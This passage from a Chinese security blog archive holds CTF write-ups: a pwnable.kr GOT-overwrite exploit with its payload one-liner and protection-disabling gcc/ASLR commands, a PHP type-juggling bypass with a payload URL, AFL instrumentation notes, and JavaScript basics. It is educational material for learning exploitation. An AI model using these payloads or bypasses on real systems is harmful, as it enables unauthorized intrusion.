（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。 &nbsp;&nbsp;&nbsp;&nbsp;工作原理如图： &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;例如： gcc -z execstack -o test test.c1234&gt; gcc -o test test.c // 默认情况下，开启NX保护&gt; gcc -z execstack -o test test.c // 禁用NX保护&gt; gcc -z noexecstack -o test test.c // 开启NX保护&gt; **② RELRO** &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;relro 是一种用于加强对 binary 数据段的保护的技术。设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为 ” Partial RELRO ”，说明我们对GOT表具有写权限。 12345&gt; gcc -o test test.c // 默认情况下，是Partial RELRO&gt; gcc -z norelro -o test test.c // 关闭，即No RELRO&gt; gcc -z lazy -o test test.c // 部分开启，即Partial RELRO&gt; gcc -z now -o test test.c // 全部开启，即&gt; **③ CANNARY（栈保护）** &nbsp;&nbsp;&nbsp;&nbsp;这个选项表示栈保护功能有没有开启。 &nbsp;&nbsp;&nbsp;&nbsp;栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。 &nbsp;&nbsp;&nbsp;&nbsp;因此在编译时可以控制是否开启栈保护以及程度，例如： 12345&gt; gcc -o test test.c // 默认情况下，不开启Canary保护&gt; gcc -fno-stack-protector -o test test.c //禁用栈保护&gt; gcc -fstack-protector -o test test.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码&gt; gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码&gt; **④ FORTIFY** &nbsp;&nbsp;&nbsp;&nbsp;fority其实非常轻微的检查，用于检查是否存在缓冲区溢出的错误。适用情形是程序采用大量的字符串或者内存操作函数，如memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets以及宽字符的变体。 &nbsp;&nbsp;&nbsp;&nbsp;_FORTIFY_SOURCE设为1，并且将编译器设置为优化1(gcc -O1)，以及出现上述情形，那么程序编译时就会进行检查但又不会改变程序功能 &nbsp;&nbsp;&nbsp;&nbsp;_FORTIFY_SOURCE设为2，有些检查功能会加入，但是这可能导致程序崩溃。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;gcc -D_FORTIFY_SOURCE=1 仅仅只会在编译时进行检查 (特别像某些头文件 #include &lt;string.h&gt;) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;gcc -D_FORTIFY_SOURCE=2 程序执行时也会有检查 (如果检查到缓冲区溢出，就终止程序) **⑤ PIE(ASLR)** &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PIE 即 Postion-Indenpendent executable(地址无关可执行文件)。一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。 &nbsp;&nbsp;&nbsp;&nbsp;内存地址随机化机制（address space layout randomization)，有以下三种情况 &nbsp;&nbsp;&nbsp;&nbsp;0 - 表示关闭进程地址空间随机化。 &nbsp;&nbsp;&nbsp;&nbsp;1 - 表示将mmap的基址，stack和vdso页面随机化。 &nbsp;&nbsp;&nbsp;&nbsp;2 - 表示在1的基础上增加栈（heap）的随机化。 &nbsp;&nbsp;&nbsp;&nbsp;可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。 &nbsp;&nbsp;&nbsp;&nbsp;Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。 &nbsp;&nbsp;&nbsp;&nbsp;liunx下关闭PIE的命令如下： sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space 6.GOT 表覆写技术 &nbsp;&nbsp;&nbsp;&nbsp;原理：由于got表是可写的，把其中的函数地址覆盖为我们shellcode地址，在程序进行调用这个函数时就会执行shellcode。 三、题目要求 &nbsp;&nbsp;&nbsp;&nbsp;该题要求我们连接 pwnable.kr 的服务器，密码是 guest，经过尝试我在 Linux 系统环境下连上去以后，看看了目录，如下： &nbsp;&nbsp;&nbsp;&nbsp;题目可能是让我们通过这三个文件找出 flag。 四、解题思路 &nbsp;&nbsp;&nbsp;&nbsp;在整理出解题思路之前，我们需要试探一下题目中的文件，看看文件有什么要求。 **① 查看 passcode 的文件类型** `file passcode` &nbsp;&nbsp;&nbsp;&nbsp;从上图可以看出，passcode 是一个 32 位的 ELF 文件。 **② 查看 passcode 的保护机制** `checksec passcode` &nbsp;&nbsp;&nbsp;&nbsp;从上图可以说明： passcode 文件是 i386 的 我们对 GOT 有写的权限 开启了栈保护，也就意味着我们没有办法利用栈溢出 **③ 查看 passcode.c 的源文件 ** &nbsp;&nbsp;&nbsp;&nbsp;从上图可以看到 scanf 语句中没有 &amp; 取值符号，所以我们可以根据这个来利用漏洞 **④ 查看 welcome 和 login 函数** &nbsp;&nbsp;&nbsp;&nbsp;通过分析 passcode.c 的源代码，我们可以发现 main（caller）连续调用了 welcome 和 login 函数，在调用的时候并没有 push 和 pop，所有这两个函数用的是同一个 ebp，如下图： &nbsp;&nbsp;&nbsp;&nbsp;那么我们找到name位于ebp-0x70，passcode1位于ebp-0x10，passcode2位于ebp-0xc，name与passcode1之间隔了0x70-0x10=96个字节。 **⑤ 如何利用 scanf 和 GOT 表漏洞** &nbsp;&nbsp;&nbsp;我们可以用 fflush() / printf() 的地址覆盖 passcode1 后，scanf(“%d”，&amp;fflush()) 将会把之后的输入写入到GOT表中，于是把 login() 中 system(“/bin/cat flag”) 的地址转换成十进制写进去，当程序调用fflush()的时候就会执行system()，思路如下图： 五、解题步骤1.构造 payload payload = ‘a’*96+’\x00\xa0\x04\x08’ +’134514147\n’ 2.python -c 执行命令 python - c &quot;print(&#39;a&#39;*96+&#39;\x00\xa0\x04\x08&#39; +&#39;134514147\n&#39;)&quot;|./passcode &nbsp;&nbsp;&nbsp;&nbsp;结果如下图： 参考文章GOT表和PLT表知识详解 pwnable.kr - passcode pwnable 笔记 Toddler’s Bottle - passcode scanf忘记加’&amp;’危害有多大？ 详解GOT表覆写攻击技术 p4nda 通过pwnable.kr从零学pwn C语言函数调用栈(一) 软件常用安全防护手段 checksec 总结]]></content>
      <tags>
        <tag>解题总结</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AFL 的代码插桩问题]]></title>
    <url>%2F2019%2F09%2F07%2F2019.09.07%EF%BC%8880%EF%BC%89%2F</url>
    <content type="text"><![CDATA[一、什么是 AFL？ &nbsp;&nbsp;&nbsp;&nbsp;AFL 是一款用于发现漏洞的模糊测试工具，是由下面三个部分组成的： 编译器wrapper：他的功能在于对目标软件（开源）进行编译，编译过程中插入一些AFL识别的函数用以识别探索路径，众所周知的linux下的C/C++编译工具gcc/g++，afl的编译工具为afl-gcc/afl-g++,afl-clang等。 测试器fuzzer （主体）：afl-fuzz，就是AFL重要的主体，用以对软件进行fuzzing。 其他工具：如afl-cmin,afl-tmin等，一个成功的C位都必须多个辅助才行，这些工具都是为提升测试的效率和成功率而服务的。 &nbsp;&nbsp;它的工作流程如下图： 二、代码插桩1.什么是插桩？ &nbsp;&nbsp;&nbsp;&nbsp;在AFL编译文件时候afl-gcc会在规定位置插入桩代码，可以理解为一个个的探针(但是没有暂停功能)，在后续fuzz的过程中会根据这些桩代码进行路径探索，测试等。对于插桩的理解也可以这样理解，如下图： &nbsp;&nbsp;&nbsp;&nbsp;如果我们输入的数据是：a = 3,b = 3，那么程序会输出多少呢？通过程序的执行可以得到一个路径：ABDCFG，那么在这个程序里 printf 语句就是我们插入的代码。 ​ 在简单的了解了什么是插桩后，下面我们来介绍一下 afl 中的插桩。 2.AFL 中的插桩 ① 插桩存在 afl 测试中的哪一个环节？ ​ ​ 从上面的图中可以得出，AFL 的插桩是在编译的过程中同时进行插桩的，afl-gcc 是 afl 的一个编译器，是将源语言编译成汇编代码，而插桩是在汇编代码汇编成机器代码的过程中进行的，对于linux来说，as 是常用的汇编器，那么 afl-as 便会作为汇编器，执行实际的汇编操作。所以说，AFL 的代码插桩，就是将源文件编译成汇编代码后，通过afl-as来完成的。 afl-as 会生成一个随机数，作为标识分支的 key。 ​ 在这里需要值得注意的是，实际插桩是 afl-as 来完成的，那么为什么又说 afl-gcc 是来插桩的呢？因为 afl-gcc 的源码中在头文件中调用了 afl-as.h 所以说是将 afl-as 的功能装进了 afl-gcc 里。 ② AFL 中的编译器 ​ 对于 afl 的编译器来说有两种，一种是 afl-gcc，一种是 afl-clang，通过查看源码可以得到，这两个编译器实际上是 gcc、clang 的一个 wrapper。 ③ 如何进行插桩 12345678910111213141516171819202122232425262728&gt; static void add_instrumentation(void) &#123;&gt; if (input_file)&gt; &#123; //打开输入文件&gt; inf = fopen(input_file, "r");&gt; if (!inf) PFATAL("Unable to read '%s'", input_file);&gt; &#125; &gt; else &gt; inf = stdin;&gt; outfd = open(modified_file, O_WRONLY | O_EXCL | O_CREAT, 0600); //创建输出文件&gt; if (outfd &lt; 0) &gt; PFATAL("Unable to write to '%s'", modified_file);&gt; outf = fdopen(outfd, "w");&gt; if (!outf) &gt; PFATAL("fdopen() failed"); &gt; while (fgets(line, MAX_LINE, inf)) //读取输入的每行&gt; &#123; &gt; if (!pass_thru &amp;&amp; !skip_intel &amp;&amp; !skip_app &amp;&amp; !skip_csect &amp;&amp; instr_ok &amp;&amp; //它只会在代码里的合适位置插桩而不会对文件每行插桩，判断代码在下面，&gt; instrument_next &amp;&amp; line[0] == '\t' &amp;&amp; isalpha(line[1])) &gt; &#123;&gt; fprintf(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32, //关键处，会根据位数选择对应模板&gt; R(MAP_SIZE)); //R(MAP_SIZE)定义为 # define R(x) (random() % (x))&gt; instrument_next = 0;&gt; ins_lines++;&gt; &#125;&gt; fputs(line, outf); //输出&gt; //以下为如上插桩条件判断代码。。。&gt; &#125;&gt; &gt; ​ 执行的插桩代码实际上是： 12&gt; fprintf(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32, R(MAP_SIZE));&gt; &gt; ​ 这里要以 32 位的模板为例，给出要插入的 trampoline_fmt_32 的汇编代码段，如下： 1234567891011121314151617181920212223&gt; static const u8* trampoline_fmt_32 =&gt; &gt; &quot;\n&quot;&gt; &quot;/* --- AFL TRAMPOLINE (32-BIT) --- */\n&quot;&gt; &quot;\n&quot;&gt; &quot;.align 4\n&quot;&gt; &quot;\n&quot;&gt; &quot;leal -16(%%esp), %%esp\n&quot;&gt; &quot;movl %%edi, 0(%%esp)\n&quot;&gt; &quot;movl %%edx, 4(%%esp)\n&quot;&gt; &quot;movl %%ecx, 8(%%esp)\n&quot;&gt; &quot;movl %%eax, 12(%%esp)\n&quot;&gt; &quot;movl $0x%08x, %%ecx\n&quot;&gt; &quot;call __afl_maybe_log\n&quot;&gt; &quot;movl 12(%%esp), %%eax\n&quot;&gt; &quot;movl 8(%%esp), %%ecx\n&quot;&gt; &quot;movl 4(%%esp), %%edx\n&quot;&gt; &quot;movl 0(%%esp), %%edi\n&quot;&gt; &quot;leal 16(%%esp), %%esp\n&quot;&gt; &quot;\n&quot;&gt; &quot;/* --- END --- */\n&quot;&gt; &quot;\n&quot;;&gt; &gt; ​ 上面的汇编代码主要做了一下几个工作： 保存 edi 等寄存器 将 ecx 的值设置为 fprintf() 所要打印的变量（key）内容 调用方法__afl_maybe_log() 恢复寄存器 3.实现代码插桩的途径 （1）它可以通过插入汇编代码直接在每个分支点周围用汇编来扩充二进制文件。 （2）它可以使用模拟器（QEMU）捕获无法重新编译的二进制文件的跟踪信息。 （3）它可以通过在LLVM中添加传递并添加汇编语言以“原则”方式执行操作。通过LLVM的方法（3）的一个优点是LLVM可以产生非常干净的中间表示（称为bitcode）]]></content>
      <tags>
        <tag>二进制</tag>
        <tag>fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XCTF 新人阶段 — web]]></title>
    <url>%2F2019%2F09%2F02%2F2019.09.02%EF%BC%8879%EF%BC%89%2F</url>
    <content type="text"><![CDATA[Today I mainly write some notes about the web topic of the XCTF newcomer stage.The following is a list of topics. view source get post robots backup cookie disabled button simple js xff referer weak auth webshell command execution simple php In order to make the knowledge points involved in each topic as clear as possible.I only summarize the knowledge points of the first two topics. 一、view source1. Question requirment 2.Basic knowledge what is the role of browser F12? **Elements** It is used to view or modify the attributes of HTML elements ,CSS properties,listen events,breakpoints,and more. **Console** The console is typically used to execute one-time code,view JavaScript objects,and view debug log information or exception information. **Sources** The page is used to view the HTML source code of the current web page,JavaScript source code,CSS source code,and most importantly,you can debug(调试) the JavaScript source code,add breakpoints to the JS code and so on. **Network** Network page is mainly used to view information related to the network connection such as the header. Header:The panel lists the resource request url,HTTP method,response status code,request header and response header and their respective values,request parameter,etc. Preview:View panel to view resource Response:The response information panel contains content that has not been formatted by resource Timing:The details of the resource request take time. 3.Problem solving step Press f12 button and we can view the flag on the Elements page. 二、post_get1.Question Requirement 2.Basic knowledge ◉ First,there are some difference between post and get. &nbsp;&nbsp;&nbsp;&nbsp;Because someone has done a good summary of the two requests,I can’t summarize them here.Click here to learn more. 3.Problem Solving step ◉ The first step: &nbsp;&nbsp;&nbsp;&nbsp;Open the URL in the question and find that we are required to submit a variable named “a” with a value of 1 by GET method. ◉ The second step: &nbsp;&nbsp;&nbsp;&nbsp;I constructed “?a=1” in the GET request line by BurpSuit.As shown following the picture: ◉ The third step: &nbsp;&nbsp;&nbsp;&nbsp;In the previous step,we will send the constructed command to the server and we will get the following page: ◉ The fourth step: &nbsp;&nbsp;&nbsp;&nbsp;The step requires us to submit a variable named “b” with a value of 2 by POST method.Here,we need to use a tool named “HackBar”.We can do the work by it. ◉ The last step: &nbsp;&nbsp;&nbsp;&nbsp;In the step,we can get the flag about the problm. ​]]></content>
      <tags>
        <tag>解题总结</tag>
        <tag>web</tag>
        <tag>XCTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BabyPHP 解题总结]]></title>
    <url>%2F2019%2F08%2F01%2F2019.08.01%EF%BC%8878%EF%BC%89%2F</url>
    <content type="text"><![CDATA[一、PHP 部分漏洞1.$_GET 和 $_POST 如果 GET 参数中设置 name[]=a，那么 $_GET[&#39;name&#39;] = [a]，php 会把 []=a 当成数组传入， $_GET 会自动对参数调用 urldecode。 $_POST 同样存在此漏洞，提交的表单数据，user[]=admin，$_POST[&#39;user&#39;] 得到的是 [&#39;admin&#39;] 是一个数组。 2.sha1 和 md5 函数 PHP在处理哈希字符串时，会利用 ”!=” 或 ”==” 来对哈希值进行比较，它把每一个以 “0E” 开头的哈希值都解释为 0，所以如果两个不同的密码经过哈希以后，其哈希值都是以 “0E” 开头的，那么PHP将会认为它们都是 0。 MD5不能处理数组，若有以下判断则可用数组绕过 12345&gt; if(@md5($_GET['a']) == @md5($_GET['b']))&gt; &#123;&gt; echo "yes";&gt; &#125;&gt; 3.” === “ 符号 在数学计算中我们习惯的用 “a = b”，表示的意思是 a 的值与 b 的值相等，而在计算机世界中这样的说法是完全错误的，在计算机的计算中 “ a = b ”：表示的意思是将 b 的值赋值给 a； “ a == b ”：表示的意思是判断 a 的值与 b 的值是否相等； “ a === b ”：表示的意思是 a 的类型以及相应的值与 b 的类型以及相应的值是否相等，如果返回 1，则表示，a 与 b 是同类型同值关系； 二、分析题目12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Exercise&lt;/title&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;PHP&apos;s basic feature&lt;/h1&gt;&lt;!--好吧其实是老套路了--&gt; &lt;?php require_once(&apos;flag.php&apos;); if (isset($_GET[&apos;name&apos;]) and isset($_GET[&apos;password&apos;]) &amp;&amp; isset($_GET[&apos;test&apos;]))&#123; // ========== Stage 1 ========== $test=$_GET[&apos;test&apos;]; $test=md5($test); if($test==&apos;0&apos;) &#123; print &apos;You passed stage 1.&lt;br /&gt;&apos;; &#125; else&#123; print &quot;Game over at stage 1.&quot;; exit(); &#125; // ========== Stage 2 ========== if ($_GET[&apos;name&apos;] == $_GET[&apos;password&apos;])&#123; print &apos;Your password can not be your name.&apos;; exit(); &#125; else if (sha1($_GET[&apos;name&apos;]) === sha1($_GET[&apos;password&apos;]))&#123; print &apos;You passed stage 2.&lt;br /&gt;&apos;; print &apos;Flag: &apos;.$flag; &#125; else&#123; print &apos;Invalid password&apos;; exit(); &#125; &#125; echo &apos;&lt;hr /&gt;&apos;; show_source(__FILE__); ?&gt; &lt;/body&gt; &lt;/html&gt; 1.stage 1 分析 如上面的代码所示，需要输入三个参数：name、password 和 test，对 stage 1 代码分析： 12345678910$test=$_GET['test']; $test=md5($test); if($test == '0') &#123; print 'You passed stage 1.&lt;br /&gt;'; &#125; else&#123; print "Game over at stage 1."; exit(); &#125; 对输入的 test 值进行 md5 加密，使得加密后的结果等于 0 ，这样就可以通过 stage 1，那么我们在解题时需要做的就是如何使得 test 加密后的结果等于 0 呢？ 2.stage 2 分析 在分析了 stage 1 后，我们再继续对 stage 2 的代码进行分析： 123456789101112if ($_GET['name'] == $_GET['password'])&#123; print 'Your password can not be your name.'; exit(); &#125; else if (sha1($_GET['name']) === sha1($_GET['password']))&#123; print 'You passed stage 2.&lt;br /&gt;'; print 'Flag: '.$flag; &#125; else&#123; print 'Invalid password'; exit(); &#125; 首先要使得输入的 name 和 password 的值不相等，然后将输入的 name 和 password 对应的值分别进行 sha1 进行加密 ，使得加密后的结果是“同类型同值”的。在分析了 stage 2 后，我们后面需要做的工作有两个： 分别找到一个 name 和 password 的值，这两个值不能相等，并对这两个进行 md5 加密，使得结果是同类型同值的 ； 如果上述的方法不能实现，那么我们再根据 PHP 的漏洞进行攻击。 三、解题步骤1.找出 test 的值 在 BabyXSS 题目中，我们曾经写过一个是关于求通过输入数据，数据经过 md5 加密并匹配给定的字符串的脚本，那么我们将那个程序直接拿过来用，把给定的字符串替换为 0 ，我们尝试求一下解，果然我们得到了一个数值：27，但是将 test = 27 放到 URL 中，结果是错误的。 那么我们再换个思维去思考这个问题，在 PHP 漏洞的总结中可以知道，PHP在处理哈希字符串时，会利用 ”!=” 或 ”==” 来对哈希值进行比较，它把每一个以 “0E” 开头的哈希值都解释为 0，所以如果两个不同的密码经过哈希以后，其哈希值都是以 “0E” 开头的，那么PHP将会认为它们都是 0。那么我们只需要找到加密后的结果是以 0E 开头的原文就可以了，那么经过尝试我们得出以下几个原文和密文： QNKCDZO ——&gt; 0e830400451993494058024219903391 PJNPDWY ——&gt; 0e291529052894702774557631701704 NWWKITQ ——&gt; 0e763082070976038347657360817689 NOOPCJF ——&gt; 0e818888003657176127862245791911 MMHUWUV ——&gt; 0e701732711630150438129209816536 MAUXXQC ——&gt; 0e478478466848439040434801845361 IHKFRNS ——&gt; 0e256160682445802696926137988570 GZECLQZ ——&gt; 0e537612333747236407713628225676 我们只需要选择其中的一个就可以，在这里我们选择 “QNKCDZO” 进行尝试得到下图的结果： 2.求 name 和 password 下面我们要求 name 和 password 的值了，在这里需要提的一个就是 sha1 碰撞，通过这种碰撞是可以找出两个数的 sha1 值相等的，但是花的时间和精力就相对大些，那我们是不是也可以通过 PHP 的漏洞，绕过 sha1 使得满足 if 条件呢？ 答案是肯定的，在 PHP 漏洞总结中，我们有一个是关于 sha1 的，sha1([]) 和 md5([]) 处理数组不会报错，直接返回false，那么我们可以通过使 name 和 password 为数组类型，sha1 对数组处理后返回 null 绕过 “===” 。 现在我们使 name[]=0&amp;password[]=2，这个时候能够成功的满足if ($_GET[&#39;name&#39;] == $_GET[&#39;password&#39;])不相等，在else if (sha1($_GET[&#39;name&#39;]) === sha1($_GET[&#39;password&#39;]))的条件中，sha1 对 name 和 password 的数组类型无法理解都返回 null，也就使得 null === null ，所以也就满足第二个条件。 3.提交构造的 payload，获取 flag 经过以上两步的分析，我们可以得到三个参数的值，那么下面我们构造一下 payload ： http://123.207.149.64:23331/feature/?test=QNKCDZO&password[]=2&name[]=0我们可以从服务器得到 flag： .png)]]></content>
      <tags>
        <tag>解题总结</tag>
        <tag>web</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript 学习笔记（一）]]></title>
    <url>%2F2019%2F07%2F31%2F2019.07.31%EF%BC%8877%EF%BC%89%2F</url>
    <content type="text"><![CDATA[一、JS 简介 getElementById() 是多个 JavaScript HTML 方法之一 JavaScript 能够改变 HTML 的内容： document.getElementById("demo").innerHTML = "Hello JavaScript"; JavaScript 能够改变 HTML 属性： document.getElementById("demo").src = JavaScript 能够改变 HTML 样式 (CSS): document.getElementById("demo").style.fontSize="" JavaScript 能够隐藏 HTML元素: document.getElementById("demo").style.display='none' JavaScript 能够显示 HTML 元素: document.getElementById("demo").style.display="block" 二、JS 使用 1. \标签&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在 HTML 中，JavaScript 代码必须位于 \ 与 \ 标签之间. 2.JavaScript 函数和事件&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;JavaScript 函数是一种 JavaScript 代码块，它可以在调用时被执行。例如，当发生事件时调用函数，比如当用户点击按钮时。 3. \ 或 \ 中的 JavaScript \中的 JavaScript 12345678910111213141516&gt; &lt;!DOCTYPE html&gt;&gt; &lt;html&gt;&gt; &lt;head&gt;&gt; &lt;script&gt;&gt; function myFunction() &#123;&gt; document.getElementById("demo").innerHTML = "段落被更改。";&gt; &#125;&gt; &lt;/script&gt;&gt; &lt;/head&gt;&gt; &lt;body&gt;&gt; &lt;h1&gt;一张网页&lt;/h1&gt;&gt; &lt;p id="demo"&gt;一个段落&lt;/p&gt;&gt; &lt;button type="button" onclick="myFunction()"&gt;试一试&lt;/button&gt;&gt; &lt;/body&gt;&gt; &lt;/html&gt;&gt; &gt; \ 中的 JavaScript 123456789101112131415161718192021222324252627&gt; &lt;!DOCTYPE html&gt;&gt; &lt;html&gt;&gt; &lt;body&gt; &gt; &lt;h1&gt;A Web Page&lt;/h1&gt;&gt; &lt;p id="demo"&gt;一个段落&lt;/p&gt;&gt; &lt;button type="button" onclick="myFunction()"&gt;试一试&lt;/button&gt;&gt; &lt;script&gt;&gt; function myFunction() &#123;&gt; document.getElementById("demo").innerHTML = "段落被更改。";&gt; &#125;&gt; &lt;/script&gt;&gt; &lt;/body&gt;&gt; &lt;/html&gt;&gt; &lt;!DOCTYPE html&gt;&gt; &lt;html&gt;&gt; &lt;body&gt; &gt; &lt;h1&gt;A Web Page&lt;/h1&gt;&gt; &lt;p id="demo"&gt;一个段落&lt;/p&gt;&gt; &lt;button type="button" onclick="myFunction()"&gt;试一试&lt;/button&gt;&gt; &lt;script&gt;&gt; function myFunction() &#123;&gt; document.getElementById("demo").innerHTML = "段落被更改。";&gt; &#125;&gt; &lt;/script&gt;&gt; &lt;/body&gt;&gt; &lt;/html&gt;&gt; &gt; 注意：把脚本置于 \ 元素的底部，可改善显示速度，因为脚本编译会拖慢显示 4.外部脚本 外部文件：myScript.js 外部脚本很实用，如果相同的脚本被用于许多不同的网页。JavaScript 文件的文件扩展名是 .js。如需使用外部脚本，请在\ 标签的 src (source) 属性中设置脚本的名称 123456789101112131415161718&gt; &lt;script src="myScript.js"&gt;&lt;/script&gt;&gt; &lt;!DOCTYPE html&gt;&gt; &lt;html&gt;&gt; &lt;body&gt;&gt; &gt; &lt;h2&gt;外部 JavaScript&lt;/h2&gt;&gt; &gt; &lt;p id="demo"&gt;一个段落。&lt;/p&gt;&gt; &gt; &lt;button type="button" onclick="myFunction()"&gt;试一试&lt;/button&gt;&gt; &gt; &lt;p&gt;（myFunction 存储在名为 "myScript.js" 的外部文件中。）&lt;/p&gt;&gt; &gt; &lt;script src="/demo/myScript.js"&gt;&lt;/script&gt;&gt; &gt; &lt;/body&gt;&gt; &lt;/html&gt;&gt; &gt; 外部引用的方式 可通过完整的 URL 或相对于当前网页的路径引用外部脚本： 12&gt; &lt;script src="https://www.w3school.com.cn/js/myScript1.js"&gt;&lt;/script&gt;&gt; &gt; 使用了位于当前网站上指定文件夹中的脚本： 12&gt; &lt;script src="/js/myScript1.js"&gt;&lt;/script&gt;&gt; &gt; 链接了与当前页面相同文件夹的脚本： 12&gt; &lt;script src="myScript1.js"&gt;&lt;/script&gt;&gt; 三、JS 输出 1. JS 显示方案&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;JavaScript 能够以不同方式“显示”数据： 使用window.alert()写入警告框 使用 document.write()写入 HTML 输出 使用 innerHTML 写入 HTML 元素 使用 console.log() 写入浏览器控制台 2.使用 innerHTMLdocument.getElementById(id) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;id 属性定义 HTML 元素。innerHTML 属性定义 HTML 内容： 123456789101112&gt; &lt;!DOCTYPE html&gt;&gt; &lt;html&gt;&gt; &lt;body&gt;&gt; &lt;h1&gt;我的第一张网页&lt;/h1&gt;&gt; &lt;p&gt;我的第一个段落&lt;/p&gt;&gt; &lt;p id="demo"&gt;&lt;/p&gt;&gt; &lt;script&gt;&gt; document.getElementById("demo").innerHTML = 5 + 6;&gt; &lt;/script&gt;&gt; &lt;/body&gt;&gt; &lt;/html&gt; &gt; &gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;提示：更改HTML 元素的 innerHTML 属性是在 HTML 中显示数据的常用方法。 3.使用 document.write()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;出于测试目的，使用 document.write() 比较方便. 123456789&gt; &lt;!DOCTYPE html&gt;&gt; &lt;html&gt;&gt; &lt;body&gt;&gt; &lt;h1&gt;我的第一张网页&lt;/h1&gt;&gt; &lt;p&gt;我的第一个段落&lt;/p&gt;&gt; &lt;button onclick="document.write(5 + 6)"&gt;试一试&lt;/button&gt;&gt; &lt;/body&gt;&gt; &lt;/html&gt;&gt; &gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意：在HTML 文档完全加载后使用 document.write()将删除所有已有的 HTML，document.write() 方法仅用于测试。 4.使用 window.alert()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;能够使用警告框来显示数据： 1234567891011&gt; &lt;!DOCTYPE html&gt;&gt; &lt;html&gt;&gt; &lt;body&gt;&gt; &lt;h1&gt;我的第一张网页&lt;/h1&gt;&gt; &lt;p&gt;我的第一个段落&lt;/p&gt;&gt; &lt;script&gt;&gt; window.alert(5 + 6);&gt; &lt;/script&gt;&gt; &lt;/body&gt;&gt; &lt;/html&gt; &gt; &gt; 5.使用 console.log()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在浏览器中，您可使用 console.log() 方法来显示数据。可以通过 F12 来激活浏览器控制台，并在菜单中选择“控制台”。 1234567891011&gt; &lt;!DOCTYPE html&gt;&gt; &lt;html&gt;&gt; &lt;body&gt;&gt; &lt;h1&gt;我的第一张网页&lt;/h1&gt;&gt; &lt;p&gt;我的第一个段落&lt;/p&gt;&gt; &lt;script&gt;&gt; console.log(5 + 6);&gt; &lt;/script&gt;&gt; &lt;/body&gt;&gt; &lt;/html&gt;&gt;]]></content>
      <tags>
        <tag>web</tag>
        <tag>JavaScritpt</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BaByXSS 解题总结]]></title>
    <url>%2F2019%2F07%2F27%2F2019.07.27%EF%BC%8876%EF%BC%89%2F</url>
    <content type="text"><![CDATA[一、基础知识1. XSS 攻击 ​ 有关 XSS 攻击的基础知识、原理、手段、类别和目的均已在昨天的博文中均有涉及，具体的可以点击这里进行查看，有关 XSS 攻击更详细的知识，我还会将在后期陆续进行更新和补充。 2. Cookie ① 什么是 Cookie？ ​ Cookie（复数形态Cookies），又称为“小甜饼”。类型为“小型文本文件”[1]，指某些网站为了辨别用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密）。由网景公司的前雇员卢·蒙特利在1993年3月发明。最初定义于RFC 2109。当前使用最广泛的 Cookie标准却不是RFC中定义的任何一个，而是在网景公司制定的标准上进行扩展后的产物。 ② Cookie 的用途是什么？​ 因为HTTP协议是无状态的，即服务器不知道用户上一次做了什么，这严重阻碍了交互式Web应用程序的实现。在典型的网上购物场景中，用户浏览了几个页面，买了一盒饼干和两瓶饮料。最后结帐时，由于HTTP的无状态性，不通过额外的手段，服务器并不知道用户到底买了什么，所以Cookie就是用来绕开HTTP的无状态性的“额外手段”之一。服务器可以设置或读取Cookies中包含信息，借此维护用户跟服务器会话)中的状态。 在刚才的购物场景中，当用户选购了第一项商品，服务器在向用户发送网页的同时，还发送了一段Cookie，记录着那项商品的信息。当用户访问另一个页面，浏览器会把Cookie发送给服务器，于是服务器知道他之前选购了什么。用户继续选购饮料，服务器就在原来那段Cookie里追加新的商品信息。结帐时，服务器读取发送来的Cookie就行了。 